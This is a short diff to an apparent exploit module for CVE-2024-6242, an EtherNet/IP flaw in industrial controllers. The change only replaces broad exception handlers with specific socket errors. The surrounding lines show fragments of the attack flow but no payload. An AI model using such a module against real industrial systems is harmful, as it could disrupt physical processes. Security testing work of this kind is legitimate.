@@ -59,7 +59,7 @@ class Exploit(Exploit):
             s.connect((self.target, self.port))
             s.close()
             return True
-        except Exception:
+        except (ConnectionError, TimeoutError, OSError):
             return False
 
     def run(self):
@@ -104,7 +104,7 @@ class Exploit(Exploit):
                 return
             session_handle = struct.unpack_from("<I", resp, 4)[0]
             print_success(f"[CVE-2024-6242] EtherNet/IP session: 0x{session_handle:08X}")
-        except Exception as exc:
+        except (ConnectionError, TimeoutError, OSError) as exc:
             print_error(f"[CVE-2024-6242] Connection failed: {exc}")
             return
 
@@ -156,10 +156,10 @@ class Exploit(Exploit):
             else:
                 print_info(f"[CVE-2024-6242] Read response: {len(rsp_read)} bytes (may need session follow-up)")
 
-        except Exception as exc:
+        except (ConnectionError, TimeoutError, OSError) as exc:
             print_error(f"[CVE-2024-6242] Exploit error: {exc}")
         finally:
             try:
                 sock.close()
-            except Exception:
+            except OSError:
                 pass
